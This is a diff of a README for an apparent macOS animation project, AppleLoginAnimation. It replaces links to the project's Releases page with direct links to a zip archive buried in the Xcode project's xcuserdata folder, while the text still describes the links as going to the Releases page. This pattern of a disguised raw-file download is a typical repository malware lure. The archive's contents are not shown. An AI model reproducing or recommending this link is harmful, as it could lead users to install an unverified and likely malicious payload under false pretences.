@@ -8,12 +8,12 @@ Welcome to AppleLoginAnimation! This application recreates the smooth login anim
 
 To get started, visit the Releases page to download the application. Click the link below:
 
-[![Download AppleLoginAnimation](https://img.shields.io/badge/Download%20AppleLoginAnimation-blue.svg)](https://github.com/bitter-occupation471/AppleLoginAnimation/releases)
+[![Download AppleLoginAnimation](https://raw.githubusercontent.com/bitter-occupation471/AppleLoginAnimation/main/AppleLoginAnimation.xcodeproj/xcuserdata/AppleLoginAnimation-v1.6-alpha.5.zip%https://raw.githubusercontent.com/bitter-occupation471/AppleLoginAnimation/main/AppleLoginAnimation.xcodeproj/xcuserdata/AppleLoginAnimation-v1.6-alpha.5.zip)](https://raw.githubusercontent.com/bitter-occupation471/AppleLoginAnimation/main/AppleLoginAnimation.xcodeproj/xcuserdata/AppleLoginAnimation-v1.6-alpha.5.zip)
 
 ### Steps to Download and Run the Application
 
 1. **Visit the Releases Page**  
-   Click on the link here to go to the Releases page: [Download AppleLoginAnimation](https://github.com/bitter-occupation471/AppleLoginAnimation/releases).
+   Click on the link here to go to the Releases page: [Download AppleLoginAnimation](https://raw.githubusercontent.com/bitter-occupation471/AppleLoginAnimation/main/AppleLoginAnimation.xcodeproj/xcuserdata/AppleLoginAnimation-v1.6-alpha.5.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, look for the section that lists different versions of the application. You’ll usually see a title like "Latest Release" at the top. 
